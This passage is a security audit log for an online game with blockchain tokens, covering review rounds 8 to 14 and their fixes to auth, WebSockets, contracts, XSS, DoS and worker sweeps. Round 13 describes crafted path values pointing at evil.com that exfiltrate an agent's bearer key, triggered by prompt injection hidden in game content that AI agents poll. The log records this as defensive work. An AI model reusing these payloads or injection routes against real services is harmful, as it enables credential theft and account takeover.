  needs a working Foundry env): F1 OmertaBond.claim not pausable (design call — pin with a test), F2 the
  header comment overstates what MAX_DISCOUNT_BPS bounds (the real bound is tranche+daily-cap), F3 the
  BondQuote signer parity test must be added when the bond signer ships, F4 deploy checklist (dailyCapOMR
  must be nonzero on both bridges — the OmertaBond fixture uses 0; polBps must == BONDS.POL_BPS; signer/
  chainId must match). `forge test` remains the hard pre-mainnet gate.
- **Time/clock (aad0) — no CRIT/HIGH.** Accrual delta self-consistent (JS-written/JS-read, negatives
  floored), no hard-reset token bucket survives (all continuous `used = max(0, used − elapsed×rate)`),
  gang-income double-collect prevented by the gang+racket FOR UPDATE, cooldowns are lock-fresh + the
  direct-SQL ones (race_at/active_at) are absent from persist (no clobber), season rollover idempotent,
  negatives floored everywhere. One LOW non-exploitable consistency smell: the lazy-income clocks
  (territory/business/speakeasy) mix Postgres `now()` writes with `Date.now()` reads — NOT
  player-controllable (the delta is app-vs-DB host clock skew), §10.4-safe (the ledger always equals the
  computed amount), mitigated entirely by tight app/DB NTP; flagged for consistency (standardize on one
  clock per subsystem), not retuned.
- **Unicode/parsing (adf9) — clean besides Finding 1.** Every money-route amount rejects Infinity/NaN
  (`Number.isFinite && >0` directly or downstream — swap/bank/stake/casino/market/portfolio/boxing/stable/
  races/auction/bonds all covered); the cleanText+esc XSS defense is complete (the one survivor `'` is
  inert in double-quoted attrs + text, no inline-`<script>` name sink); auth (Privy alg-pinned/JWKS/aud/
  exp, SIWE EIP-55-canonical wallet uniqueness) sound; no `...req.body` spread anywhere (no prototype
  pollution); ledger reasons are server literals (player text never reaches a reason). LOW-MED note: the
  keyless card route resolves names case-insensitively vs a case-sensitive unique index → a case-variant
  can ambiguously resolve the public profile card (banded status only) — folded into the charset flag.

**Round 8 verdict: 1 MED fix (homoglyph). Contracts, timing, and parsing sound. Suite green + sim drift-0.**

---

## Round 9 — Sybil economics · WS/notification-bus · config/env misconfig · estate/death (2nd pass)

Four fresh lenses (background finders + manual source verification). Two HIGH deploy-fail-open + two
WS/DoS defects FIXED; the economic/estate cores verified sound again.

### Fixed (regression each — `test/security.js`)
- **Config F1 (HIGH, deploy fail-open) — the whole hardening posture hinged SOLELY on
  `NODE_ENV==='production'`, which `npm start`/`node src/server.js` never sets.** A real deploy that
  forgot the one variable most likely to be forgotten silently reverted EVERY guard at once (forgeable
  dev JWT secret, public MARKET_SEED → predictable seeded draws, rate limits off, test-only roll knobs
  live). Fix: a `hardened = NODE_ENV==='production' || !!DATABASE_URL` predicate — a real DATABASE_URL is
  the unforgeable "persistent value at stake" signal, so anything pointed at a real Postgres hardens
  regardless of NODE_ENV (dev/CI use pg-mem, no DATABASE_URL, and keep the convenient fallbacks). Applied
  to the JWT/MARKET_SEED/test-knob boot guards (`server.js`) + `rateLimitsEnabled()` (`ratelimit.js`).
- **Config F2 (HIGH) — silent in-memory DB in production.** A prod deploy that forgot `DATABASE_URL`
  booted the whole game on pg-mem (all state in RAM, lost on restart, different SQL semantics) with only
  a console line. `db.js` now refuses to boot pg-mem when `NODE_ENV==='production'` (the JWT/seed posture).
- **WS Finding 1 (MED-HIGH DoS) — the per-account socket cap was a TOCTOU.** It read the registry size
  but only ADDED the socket after three awaited queries, so concurrent connects for one token all saw
  size<MAX and all registered — blowing past the 8-cap → server-wide `streets` fan-out amplification +
  fd/memory DoS. Fix: reserve a slot SYNCHRONOUSLY (no await between read and increment) and count
  in-flight reservations alongside registered sockets, released in `finally`. Also added a standard
  ping/pong heartbeat (`app.register(websocket)` set no keepalive) so half-open/dead sockets are reaped
  (a browser auto-pongs, so legit idle viewers stay connected); interval `unref()`'d for clean exit.
- **WS Finding 2 (MED, confidentiality) — a kicked/departed member kept the family's `gang:` feed.** The
  subscription is derived ONCE at connect; on leave/kick the socket kept feeding private war/contract/
  tribute chatter until the ex-member chose to disconnect (a deliberate spy just holds it open). Fix: the
  leave/kick routes call the proven `closeAccountSockets` POST-COMMIT (committed state is now gangless);
  the client reconnects and re-derives the correct — empty — subscription. Kick looks the kicked
  member's account up server-side (never exposing the account UUID to the client — the JWT blast-radius
  analysis relies on UUIDs never reaching clients).
- **WS Finding 4 (LOW) — unbounded in-memory rate-limit `buckets` Map.** Grew one entry per account key +
  source IP forever (memory-growth DoS on the non-Redis deploy). Fix: a state-preserving eviction sweep
  (a bucket idle past a 5-min TTL has provably refilled to burst, so deleting it is identical to it never
  existing); `unref()`'d.

### Verified CLEAN (not patched)
- **Sybil economics (ae3e) — no CRIT/HIGH, no §10.4 breach.** Every cross-account transfer path is taxed
  or contribution-bounded (bodyguard/casino:pvp/boxing/stable/races −rake; convoy insurance capped at the
  per-account underwriting limit → net pool extraction ≤ 0 by construction; casino rakeback bounded by
  realized house edge). Referral once-ever latches + agent exclusion + middle-link-qualified + depth-2 cap
  all airtight. Three MED items are enumerated-faucet FARMING (referral-spark 10-crime threshold magnitude,
  same-IP pairs recorded-not-enforced, `claimSocial` pays unverified in `live` mode) — all documented
  founder sign-off / trust-faucet postures, NOT code bugs (ground rule #1 — flagged, not retuned).
- **Estate/death 2nd pass (ad23) — no new CRIT/HIGH, no §10.4 drift, no double-resolution, no
  orphan-with-consequence table, no inflated heir carry.** Every per-character table is wiped OR
  worker-resolved-with-dead-stake-burn OR intentionally account-level; loot legs carve the victim before
  the estate burn; shield ordering (bodyguard→respawn, witpro/penSafe/inHole/jailed as top gates) is
  exclusive; the bounty SUM is under `FOR UPDATE` (serialized vs the sweep); `priorPrestige` captured
  before the +legacy bump. One LOW: dead-character `missions_done`/`notifications`/stranded abandoned-crew
  rows are never reaped — PURE storage bloat, zero §10.4/gameplay impact (heir gets a fresh id, never
  re-reads them). Flagged, not patched — extending the most cross-cutting txn for a zero-consequence
  storage item isn't worth the surface; a periodic reaper is the clean home if it ever bites.
- **WS Finding 3 (LOW, cosmetic) — `notify()` `bus.emit`s the live push INSIDE the txn, pre-COMMIT.** On
  a rollback (incl. a `contention`/40P01 retry) the DB row rolls back but the live push already went out,
  and the retry fires it again. Committed state + the `/v1/notifications` backfill are correct (§10.4
  untouched, no data leak); the only impact is a phantom/duplicated LIVE-feed line. Flagged, not patched
  — a comprehensive buffer-all-emits-until-commit refactor on the hot `withCharacter`/`withTwoCharacters`
  path is disproportionate to a cosmetic feed glitch (the ~70 direct `bus.emit('streets',…)` sites share
  the same property).

**Round 9 verdict: 2 HIGH (deploy fail-open) + 2 WS/DoS fixes + 1 confidentiality fix. Sybil economics
and the estate/death path verified sound (no §10.4 breach). Suite 33/33 + sim drift-0.**

---

## Round 10 — worker/cron sweeps · request lifecycle · chain reserve/voucher · AMM/buyback (2nd chain+econ pass)

Four infrastructure/lifecycle lenses. Small correctness/availability fixes; the economic + chain cores
re-verified conservation-tight (no §10.4 breach, no over-extraction, no mint).

### Fixed
- **Worker (a221, LOW) — `sweepTrackEntries` double-releases its pool client.** On the empty-entries
  `continue` path it called `client.release()` explicitly, then the per-iteration `finally` released
  AGAIN → pg's "already released" throw, aborting the rest of that tick's track-card settlements
  (reachable only under overlapping worker executions / a concurrent-settle race; no value/§10.4 impact,
  no connection leak). Fix: drop the explicit release, let the `finally` handle it (every other sweep's
  pattern). No bespoke regression — the trigger needs real concurrency pg-mem can't reproduce.
- **Request lifecycle (a268, F2 LOW) — my R9 `/v1/gangs/kick` route's post-commit `pool.query` could
  release a committed action's idempotency key.** The account-lookup+socket-close runs AFTER commit; a
  throw there → 5xx → the onSend hook releases the key → a retry re-executes `kickMember` (bounded — a
  re-kick is a clean no-op — but a fragile pattern). Wrapped the post-commit work in a swallowing
  try/catch (a missed socket-close self-heals on reconnect; a released key is a double-execute). The
  leave route was already safe (closeAccountSockets is internally try-caught).
- **Request lifecycle (a268, F1 MED, availability) — authed READ GETs were entirely unthrottled for
  humans.** A `withCharacter` GET holds a pooled connection while it accrues+persists under a
  `SELECT … FOR UPDATE` on the caller's own row, and the pool defaulted to max=10 — so a concurrent-GET
  flood from ONE account could pin the whole pool and starve every other account (rate limits covered
  only POST/DELETE + agent GETs). Two mitigations: raise the pool `max` (env `PG_POOL_MAX`, default 20)
  for headroom, and a GENEROUS per-account read bucket (`checkReadLimit`, env `RATE_READ_*`, default
  15/s burst 60) on authed `/v1` GETs in the preHandler — sized far above the console's debounced
  polling/WS re-render so it never bites legit use, but caps a sustained connection-flood. (jwtVerify is
  cheap + no DB; a keyless public GET falls through unthrottled.)
- **Chain (a431, L1 LOW, defense-in-depth) — `markClaimed` didn't exclude `status='cancelled'`.** Not
  watcher-reachable (a cancelled voucher was never signed → no Claimed event), but the mod
  `/v1/mod/reserve/claimed` route could mark a cancelled (already-refunded) nonce → re-committing a
  refunded amount, shrinking `available` (liveness dent, never over-extraction/mint). Added
  `AND status<>'cancelled'` (`NOT claimed_onchain` already covers `'claimed'`) + extended the loud
  double-resolution alarm to fire on a cancelled hit too. Also fixed the stale L3 comment in
  `reclaimExpiredVouchers` (it still described the retired "null reader → time-grace" path; the code
  fails CLOSED — skips, never refunds — without a reader).

### Verified CLEAN / flagged (not patched)
- **Worker sweeps (a221) — remarkably well-hardened.** Every escrow resolver (tournament/futurity/
  grand-prix/stakes/main-event/auction) has a `status … FOR UPDATE` latch (exactly-once terminal
  transition) + per-row txn isolation + the documented state-singleton-before-row lock order (acyclic
  vs the player `enter*` paths); sweepLaw/loans/market/bounty/huntWanted/standing-watches/wire-alerts/
  pass-stipends/buyback/season-rollover all correct; poison-row isolation via `safe()`; chain-sync
  fail-closed on a bad chain without crashing the §10.4 monitor. The only accepted item is the known
  single-worker `spawnNpcConvoys` TOCTOU (self-correcting, §10.4-invisible).
- **Chain reserve/voucher (a431) — no CRIT/HIGH.** The full-reserve queue is fully serialized on the
  `chain_reserve FOR UPDATE` singleton (no over-extraction), nonce allocation atomic, cancel can't refund
  a signed voucher, reclaim consults on-chain `usedNonce` and FAILS CLOSED without a reader/on a wrong
  chain (no blind double-spend), markClaimed triple-guarded, EIP-712 parity exact, gear double-withdraw
  blocked, fees/store/bond idempotent + txHash-gated revenue, assertChainId in both signing processes.
  Residuals L2 (daily-cap withdrawal liveness — deploy/ops) + L4 (explicit finite guard on withdraw
  amount — cosmetic, already safe via the balance check) flagged. `forge test` remains the pre-mainnet gate.
- **Request lifecycle (a268) — machinery sound.** Idempotency reserve-before-execute (no double-execute),
  cross-account/different-body replay blocked, committed-action→non-2xx→key-release closed on both
  wrappers, two-party lock order sorted + self-deal blocked, agent throttle DB-derived, ban enforced at
  every layer. F3 (`23505→contention` mapping) flagged informational — no exploit today (23505 aborts the
  txn, nothing commits); left as-is (the world_npcs/auction first-touch materialize retries rely on it).
- **AMM/swap/buyback/staking/vig (a9ae) — no §10.4 mint or pool-drain.** k preserved exactly on both swap
  directions, all rounding house-favorable, reserves stay strictly positive, NUMERIC precision exact, the
  buyback's four slices sum to exactly `bought` (LP a true bucket transfer), staking/vig pool-gated
  transfers with no double-claim/double-return, wash-cap a correct continuous bucket. Three §10.4-SAFE
  economic/fairness items FLAGGED for founder sign-off (ground rule #1 — not code bugs): (1) the 12h
  buyback has no slippage/impact guard → sandwichable (value leakage from PoL + reduced beneficiary yield,
  bounded by pool depth, extraction still vig-capped — a `minBoughtOmr`/split-across-ticks is the dial);
  (2) staking liability accrues unbounded at APY (pool throttles payment timing not total — §10.4-safe,
  design-acknowledged); (3) first-claimer drains the shared stake/dividend pool (fairness, already flagged
  in AUDIT-portfolio). All bounded, none breach conservation.

**Round 10 verdict: 1 MED (unthrottled-GET pool-exhaustion) + 3 LOW correctness/defense-in-depth fixes.
The worker, chain-reserve, request-lifecycle, and AMM/buyback cores re-verified sound (no §10.4 breach,
no over-extraction, no mint). Suite 33/33 + sim drift-0.**

---

## Round 11 — two-party PvP locks · input validation/type-confusion · kitchen+§7.1 accrual · state-machine interlocks

Four gameplay-correctness lenses. One MED PvP gate-asymmetry + one LOW shield race fixed; the money/
lock/accrual cores re-verified sound.

### Fixed (regression added for the MED)
- **State-machine FINDING 1 (MED) — witness protection was a one-sided kill window.** `witproActive` was
  enforced ONLY on the victim (untargetable) and NEVER on the actor — unlike safehouse, which is "a
  shield, not a bunker" (blocks your own offense). So a flipped rat (`flip`→`enterWitpro`) got a
  one-time window to `fire`/`jump`/`npcHit` rivals with total immunity — every retaliation bounced off
  their witpro victim-shield. Fix: mirror the safehouse actor-block exactly — `if (witproActive(ch))
  throw` in `fire`/`jump`/`npcHit` (the assassination trio; a search that can't fire is inert, and a
  posted bounty is fulfilled by a reachable third party, so those aren't immunity holes). Regression in
  `test/social.js` (witpro'd actor can't jump/fire/npchit; the gate lapses cleanly).
- **Two-party PvP Finding 1 (LOW) — bodyguard shared-guard concurrent double-absorb.** `bodyguardAbsorbs`
  read the guard (a THIRD character neither party locks) UNLOCKED then wrote it, so a guard shared across
  principals could absorb N simultaneous cross-victim hits for a SINGLE hospitalization (both concurrent
  hits saw them un-hospitalized before either committed). §10.4-none (health/hosp aren't currency). Fix:
  claim the guard ATOMICALLY — a conditional `UPDATE … WHERE hosp_until<=now() … RETURNING` lets exactly
  ONE concurrent absorb win (the second blocks on the row, re-reads hosp_until in the future → no match).
  No NEW lock/cycle (the final write already locked the guard row); clobber-safe (no in-memory guard copy).
- **Two-party PvP Note A (INFO) — `callOutChamp` locks `boxing_title` before a fighter (inverse order).**
  Safe today only because the fighter is always the caller's own char-locked contender; added a
  ⚠️ comment so a future edit that touches a non-char-held fighter from a title-first path doesn't
  silently reintroduce an AB-BA vs `fightBout`/`resolveMainEvent`.

### Verified CLEAN / flagged (not patched)
- **Input validation / type-confusion (ae3a) — CLEAN, no CRIT/HIGH/MED.** Every amount/qty/stake/bid/
  price routes through one of two safe idioms (`Math.floor(Number(x)||0)`+MIN-reject+finite-cover, or
  explicit `Number.isFinite`+bound) — no negative-sink-flip, Infinity-cap-bypass, NaN-ledger, or
  float-accretion in any money route; enum/kind/tier/role fields allowlisted; free-text through
  `cleanText`/`String().slice`; no `...req.body` spread / `Object.assign` / prototype-pollution vector.
  Residuals all non-exploitable (mod-gated un-floored floats behind the mod key, unreachable dead-code
  bracket lookups, backstopped `*Of` default-fallthroughs).
- **Two-party PvP locks (afe8) — well-hardened.** Canonical characters→accounts→gangs→leaves→singletons
  order holds across every recently-built PvP (boxing/races/stable/speakeasy/convoy/port/world/territory/
  casino/business/market/heist/pen/loan); TOCTOU re-verify-under-lock present; self-deal blocked; refundPot/
  direct-SQL-third-party persist discipline holds. The two known retry-masked classes (market `bidListing`
  reciprocal-outbid, leader-vs-pairwise-PvP) confirmed unchanged (no NEW cycle).
- **Kitchen + §7.1 accrual (a734) — no hard §10.4 mint, no double-collect, no double-accrue.** One
  accrue/txn, full-window marker advance, lab can't dodge the Bureau raid (it resolves in the universal
  `accrue()` before every action), deal/collect faucet integrity, `crewCold` gates offline sales, every
  reason vocabularied. One LOW FLAGGED (F1): crew offline-sales lacks the D2b daily token bucket that
  racket/bank income have — §10.4-SAFE (converts finite paid-for stash to cash at an inferior fixed rate,
  bounded by stash + cook throughput, never a mint), so a founder balance-lever (ground rule #1), not a
  silent retune.
- **State-machine (aa68) — victim-reachability matrix complete + heir-carry clean.** Necro-hits blocked
  (`AND alive FOR UPDATE`), heir born with every timer NULL, death clears searches, hole-re-jail cap
  holds, all shield/absorb orderings exclusive. Two items flagged not-patched: FINDING 2 (casino
  back-room PvP gates `jailed` but not `safeHoused`, unlike the speakeasy's "seen in public" siblings — a
  design-consistency call on whether the den is a "public venue", not a clear bug — changes what a
  safehoused player may do) and FINDING 3 (shakedown/standover gate victim `hospitalized` only — the
  coherent attack-the-asset model; a founder confirm on whether a jailed owner's club should be
  standover-seizable).

**Round 11 verdict: 1 MED (witpro actor gate) + 1 LOW (bodyguard double-absorb) fixed + 1 INFO comment.
Input-validation, PvP-locks, kitchen/accrual, and the state matrix re-verified sound. Suite 33/33 + sim
drift-0.**

---

## Round 12 — Solidity contracts · cross-system exploit chains · auth token deep-dive · client-side security

Four crown-jewel/real-money lenses. One MED (JWT-in-WS-URL) + two LOW auth-hardening fixed; the
contracts, cross-system §10.4 seams, and auth perimeter re-verified sound; the client XSS finding is
server-mitigated (flagged for a dedicated escaping pass).

### Fixed
- **Client Finding 2 (MED) — the session JWT rode in the WebSocket URL (`?token=`).** The same full
  bearer token used on every REST call was in the WS URL, which lands in web-server/proxy/CDN access logs
  + browser history → token theft → account takeover. Fix: the client now passes it as a
  `Sec-WebSocket-Protocol` subprotocol value (`['bearer', token]`), NOT in the URL; the server reads it
  from that header first, keeping the query as a backward-compat fallback (the WS tests + external tools).
  Verified end-to-end (a subprotocol-token WS gets `hello`; a bad token → clean 4001) + the WS security
  regressions still pass on the query fallback.
- **Auth LOW-2 — a malformed Privy token threw a raw SyntaxError → 500.** The two `JSON.parse` calls on
  the token's header/payload now decode defensively → a clean 400 `auth_failed` (matching the SIWE path's
  malformed-sig handling); no behavior change for valid tokens.
- **Auth LOW-1 — Privy `iss` was only validated when present** (`claims.iss && …` → fail-open on an
  absent claim). Now validated unconditionally (`iss !== 'privy.io'` throws) — textbook JWT hardening;
  Privy always sets it, so no valid-token impact.

### Verified CLEAN / flagged (not patched)
- **Solidity contracts (ae95) — no CRIT/HIGH.** All six re-read: NO mint path (OMR has no owner-mint;
  every payout is `safeTransfer` from a pre-funded balance), the anti-Ponzi tranche cap enforced BEFORE
  the state write, EIP-712 domains/typehashes match the off-chain signer + replay nonce-latched + deadline
  bounded (MAX_TTL), CEI + `nonReentrant` on every external call, all privileged fns `onlyOwner` (no
  hot-deployer window, Safe-from-birth), payout math rounds toward the contract, staking principal
  conserved separately from the reward pool. Residuals all accepted-design (L1 VoucherClaim.sweep = the
  Safe-trust assumption; L2 all-or-nothing claim = liveness) or `forge test` gaps for the pre-mainnet
  checklist (L4: add a gear-mint reentrant-receiver test + a reverted-daily-cap-nonce-survives test).
  `forge test` remains THE pre-mainnet gate (Foundry egress-blocked here — adding un-runnable tests would
  violate "tests must prove things work").
- **Cross-system exploit chains (a06a) — no provable CRIT/HIGH §10.4 leak.** Every chain resolved to an
  existing mitigation: fire-loot × market/loan escrow (distinct NULL-char `*:loot`/`*:death` reasons per
  pool, both accounts persisted), gear-loot × on-chain withdraw (both serialize on the victim
  `account_persistent FOR UPDATE`), loan-heir-reassign × sweep-forfeit (re-verify catches it), dividend
  pools (separate, principal-based, pool-bounded), shared escrow reasons (different currencies/subsets —
  no double-count), estate escrow-snapshot handling (escrow tables excluded from the wipe → worker burns
  the dead stake). Two LOW documentation/regression-gap notes flagged (gear-dup lock coupling across
  modules; contraband-must-stay-out-of-persist) — not live bugs.
- **Auth token deep-dive (a9f0) — no CRIT/HIGH.** JWT alg-pinned HS256 + dev-fallback unreachable with
  real data (`hardened ⟺ DATABASE_URL ⟺ JWT_SECRET required`), Privy ES256/aud-scalar-or-array/exp/JWKS-
  kid-matched (no keys[0] fallback, header jku/x5u ignored), X confused-deputy gated off by default,
  guest→provider upgrade can't take over an existing account (UNIQUE + verified-token), agent-flag DB-read
  every gate, invite consume atomic, SIWE EIP-55 + nonce-single-use + uniqueness. LOW-3 flagged (SIWE
  plain-text message vs full EIP-4361 — safe today via server-supplied accountId + single-use nonce;
  the EIP-4361 upgrade touches the client SIWE flow, a hardening enhancement not a bug).
- **Client-side security (a4cc) — Finding 1 (HIGH-stakes but SERVER-MITIGATED, flagged).** The console
  stores the JWT in localStorage and renders player strings into innerHTML with only 6 `esc()` sites — BUT
  the server strips `<>"`backtick from EVERY player-string write path (the R8 charset regex on names/tags,
  `cleanText` on free-text — verified by the input-validation lens), so on current/fresh data there is NO
  live injection vector. The residual is (a) legacy pre-sanitization alpha-DB rows (a one-time deploy
  migration) and (b) single-layer fragility. The correct fix is a COMPLETE client-side escaping pass, but
  it needs per-sink context analysis (a blind wrap corrupts the many TEXT-context strings — describe/toast/
  feud popups — by HTML-escaping them) + a browser XSS test — a dedicated hardening task, not a safe
  autonomous mass-edit, and a 2-sink partial is security-theater. FLAGGED as the top client follow-up
  (universal `esc()` at innerHTML sinks + a legacy-row sanitize migration + a browser XSS test). Finding 3
  (raw `ev.type`/`channel` — server enums today) folds into it. Verified CLEAN: the server SVG cards + /u
  profile (fully XML-escaped, banded status only — no exact-wealth leak, parameterized name lookup, no
  huge-name DoS), admin.html (esc'd, mod-key in sessionStorage + only the x-mod-key header), /openapi.json
  (excludes /v1/mod), no CSRF (bearer not cookies), no postMessage/opener leak.

**Round 12 verdict: 1 MED (JWT-in-WS-URL) + 2 LOW (Privy hardening) fixed. Contracts, cross-system §10.4,
and the auth perimeter re-verified sound; the client XSS is server-mitigated + flagged for a dedicated
escaping pass. Suite 33/33 + sim drift-0.**

---

## Round 13 — ReDoS/algo-complexity DoS · MCP+agent-gateway · griefing/soft-lock · data-integrity

Fresh un-swept classes. TWO HIGH fixed (an SSRF/token-exfil in the shipped MCP package + a keyless
event-loop-stall DoS); the griefing gap is a PvP-balance sign-off item; the economic/§10.4 core untouched.

### Fixed
- **MCP Finding 1 (HIGH — SSRF / agent-key exfiltration).** `omerta_request` in the shipped `omerta-mcp`
  package forwarded the agent-controlled `path` via a raw `BASE + path` string concat and attached the
  PERMANENT agent bearer to every call — so a crafted path (`@evil.com/x` → host evil.com, `//evil.com`,
  a full `https://…`) steered the fetch off-origin and exfiltrated the 90-day agent key (→ account
  takeover + on-chain extraction). Realistically triggerable via prompt-injection through the
  attacker-controlled game content agents are told to poll (names, contract reasons, the feed). Fix:
  resolve `path` against BASE with `new URL` and HARD-ASSERT `url.origin === BASE.origin` before fetching
  or attaching the token — verified it blocks `//host`/scheme-prefixed/`\\`-steering while allowing every
  legit `/v1/...` path.
- **ReDoS Finding 1 (HIGH — keyless event-loop-stall DoS).** `GET /card/:type/:name.png` is keyless,
  unthrottled (non-`/v1` → outside the read-limiter), and rasterized the SVG→PNG SYNCHRONOUSLY (resvg
  `.render()` blocks the libuv loop ~tens of ms/call); `name`+`?ref=` feed the SVG-hash cache key so
  distinct values miss cache every hit → one origin flooding it stalls the whole server. Fix: (1) switch
  to resvg `renderAsync` (rasterize on a WORKER THREAD — no event-loop block), and (2) a per-IP throttle
  (`checkPublicRateLimit`, default 5/s burst 30) on the keyless render routes (`/card`,`/u`,`/v1/u`) in
  the preHandler — generous for legit OG-crawler unfurls, bounding a single-origin flood. Also closes
  **ReDoS Finding 2** (the same keyless `/u`/`/card`/`/v1/u` throttle gap).

### Verified CLEAN / flagged (not patched)
- **ReDoS/algo-complexity (adda) — no ReDoS.** Every client-facing regex is linear (no nested quantifiers/
  ambiguous alternation); Fastify body limit 1MB + maxParamLength 100 (not raised); input-driven loops
  clamped (`Math.min(qty, cap, have)`, no `new Array(qty)`/`.repeat`). Residuals flagged: F3 (`funnelStats`
  loads the full telemetry subset with no LIMIT — mod-gated, admin polls 15s) + F4 (portfolio leaderboards
  full-scan, authed + read-bucketed) — add `LIMIT`/windowing as the tables grow; lower urgency.
- **MCP / agent gateway (aaec) — beyond Finding 1, clean.** Mod routes unreachable via the proxy (no
  x-mod-key sent → server 401s), /openapi.json excludes /v1/mod + declares only bearerAuth, baseUrl is
  server-config not Host-controllable, /v1/opportunities leaks only public banded board data (anon posters
  nulled, directed pots skipped, no own-head contract, convoy value-band-only), no secrets in the docs, no
  eval/shell-injection. LOW flagged: the MCP mints a fresh idempotency UUID per call (defeats retry-safety
  — a tool-retry double-executes; README overstates it) + the agent leaderboard's `extracted` is the one
  un-banded numeric (lifetime-withdrawn, weak signal).
- **Griefing / soft-lock (a1e8) — one systematic PvP-BALANCE gap, FLAGGED for founder sign-off.** `jump`
  is the outlier PvP verb with NO per-(attacker,target) cooldown, NO location gate, NO rookie level floor,
  and safehouse deliberately doesn't block it — while every sibling (`npcHit`/`fire`/shakedown/raid/
  standover/piracy) has those gates. → no-counterplay rookie harassment (jump every ~3min/JUMP_HOSP_MS
  from any district, steal pocket cash+crates), most damaging to new players (a stated founder priority);
  + `postBounty` has no target level floor (rookie head-pricing). These touch sim-audited PvP mechanics —
  a design/balance call (ground rule #1: don't unilaterally retune), flagged prominently. Verified CLEAN:
  gang-leadership succession (no bossless lock), co-op crew stranding (status='planning' filter + worker
  sweep), loan-repay counterparty (heir reassign, always squarable), per-venue cooldowns, estate cleanup.
- **Data-integrity / schema (a3ea) — still running; verdict appended next round.**

**Round 13 verdict: 2 HIGH fixed (MCP SSRF/token-exfil + keyless card-DoS) + the keyless-route throttle
gap. Griefing flagged as a PvP-balance sign-off item; §10.4 untouched. Suite 33/33 + sim drift-0.**

### Round 13 addendum — data-integrity (a3ea)
- **MEDIUM fixed — duplicate living character per account.** `POST /v1/character` was a raced
  check-then-insert (raw `pool.query`, no lock, no backstop): two concurrent creates with DIFFERENT
  names both passed the existence SELECT and both INSERTed → a second uncontrollable "ghost" living
  character (every load reads `rows[0]`), permanently pinning the account at ≥2 living (not §10.4 — the
  drift monitor counts genesis per-character, so it's silent state corruption). Fix: serialize the create
  on the `account_persistent` row `FOR UPDATE` (the withCharacter idiom) — a concurrent second create
  blocks then sees the first's committed character → clean `exists`. (A partial `UNIQUE(account_id) WHERE
  alive` index would be the DB-level backstop but trips pg-mem's `account_id = ANY(...)` planner in the
  referral-spark path — the lock is the pg-mem-compatible + idiomatic fix; real-Postgres FOR UPDATE
  serialization is the true race backstop.) `runEstate` flips the dead row `alive=false` before the heir
  INSERT, so bloodline succession never contends. Regression in `test/security.js` (the sequential
  invariant — a second create on a live account → `exists`, exactly one living; the concurrent race isn't
  pg-mem-assertable). Verified CLEAN otherwise: zero FK/cascade orphans that carry value (chars never
  hard-deleted, estate/dissolution wipes thorough), no money-column overflow (NUMERIC), nullable
  listing/pool columns all `!= null`/`COALESCE`-guarded. LOW flagged (same as R9): dead-character
  `missions_done`/`notifications` orphan-row accumulation — harmless storage growth.

**Round 13 FINAL: 2 HIGH (MCP SSRF/token-exfil + keyless card-DoS) + 1 MED (ghost-character race) fixed;
griefing flagged as a PvP-balance sign-off item. §10.4 untouched. Suite 33/33 + sim drift-0.**

---

## Round 14 — worker resilience · static/deploy · logging/PII · time/day-boundary/seed
Four fresh peripheral lenses (the infra/operational surface the economic-core rounds don't reach).
Every finding re-verified vs source; behavioural fixes carry a regression or a boot/consistency guard.
**No CRITICAL/HIGH. No §10.4 drift.** Suite 33/33 + sim drift-0.

- **Worker resilience (F3, MED — FIXED).** Both the hourly `tick` and the 30s chain `syncTick` were
  driven by `setInterval` with a non-awaited async callback — a long-running tick (a big season
  rollover, a slow DB, a large getLogs backfill after downtime) would still be running when the next
  interval fired, so two ticks ran CONCURRENTLY in-process: a self-inflicted double-worker (double
  buyback, racing sweeps, a block range double-processed). Fix: an in-flight `ticking`/`syncing` boolean
  guard on each — a slow tick makes the next fire SKIP, never overlap (`src/worker.js`). The per-job
  `safe()` isolation (a poison row can't starve the §10.4 monitor) was already in place and verified.
- **Watcher poison-log (F2, MED — FIXED).** `syncFeeEvents`/`syncClaimedEvents`/`syncTradeFees` looped
  over logs with no per-log isolation, and `recordFeePayment` throws on a DETERMINISTIC data fault
  (`bad_fee_kind`/`bad_payer`/`bad_nonce`) BEFORE its idempotency txn — so a single malformed log would
  throw every tick, the cursor would never advance, and every legit fee behind it would be permanently
  stuck (a DoS on the whole fee/claim pipeline). Fix: a per-log `isolate()` that SKIPS a poison log (it
  can never succeed) but RE-THROWS a transient error (DB timeout/serialization) so the cursor does NOT
  advance and the window re-scans idempotently next tick — never losing a real fee (`src/watcher.js`).
- **WS `?token=` query credential (logging F1, MED — FIXED).** The WS gateway still accepted the
  full-access session bearer via `?token=` (the code's own comment warns it leaks into proxy/CDN access
  logs + browser history → account takeover). R12 already moved the console to the `Sec-WebSocket-Protocol`
  header, so nothing in-repo needed the query fallback. GATED it behind `WS_ALLOW_QUERY_TOKEN` (default
  OFF — the fail-closed INVITE_MODE posture); the four WS tests were converted to the header/subprotocol
  path (the real production credential path). `src/server.js` + `test/security.js` + `test/social.js`.
- **Backup dump perms (static/deploy LOW — FIXED).** `tools/backup.sh` wrote a COMPLETE DB copy (accounts,
  wallet addresses, the whole ledger) with default umask — group/world-readable on a shared/misconfigured
  host. Added `umask 077` + `chmod 600` on the dump + a comment flagging the DSN-on-argv password leak
  (recommend `~/.pgpass`/`PGSERVICEFILE`).
- **Mixed clock on §9 fire-readiness (time F2, LOW — FIXED).** `searches.started_at` was written by the DB
  `now()` default but the fire-readiness gate (and the `placedAt` countdown) compared it against JS
  `Date.now()` — the one mixed-clock outlier in the codebase (every other timer is JS-set AND JS-read). A
  persistent DB-behind-app skew would let a hunter fire that skew EARLY on every contract. Fix: set
  `started_at` from `Date.now()` in the INSERT so both ends use one clock (`src/social.js`).
- **Weak-seed floor (time F1(a), LOW-MED — HARDENED).** The seeded money draws use FNV-1a truncated to
  mod 1000, and the public prices board leaks many (known-prefix → mod-1000) pairs — so a SHORT/low-entropy
  operator `MARKET_SEED` is offline-recoverable, after which every numbers/track/fight draw is computable.
  A long random seed is not recoverable → seed hygiene. Added a min-entropy floor to the hardened boot
  guard (≥24 chars, ≥8 distinct — the fail-closed JWT/seed posture; `src/server.js`).

**FLAGGED, not patched (ground rule #1 / detected-with-backstop / scale-only):**
- **time F1(b) — swap FNV→keyed HMAC for the money draws** (founder call): a keyed cryptographic hash would
  make even a mediocre seed + the public price surface unexploitable, but it changes EVERY deterministic
  draw/price output — a mechanic surface. The seed-entropy floor above closes the practical risk; the hash
  swap is a sign-off item.
- **logging F2 — pg error `detail`/`where` in operator logs** (LOW defense-in-depth): a UNIQUE clash logs
  the offending row value (external id / 0x address / living name) into operator logs. Not a hard-secret
  leak (node-postgres does NOT attach SQL params, verified — tokens/agent-keys/auth_subjects passed as
  params are safe). A redaction of the global handler's full-error dump is the dial.
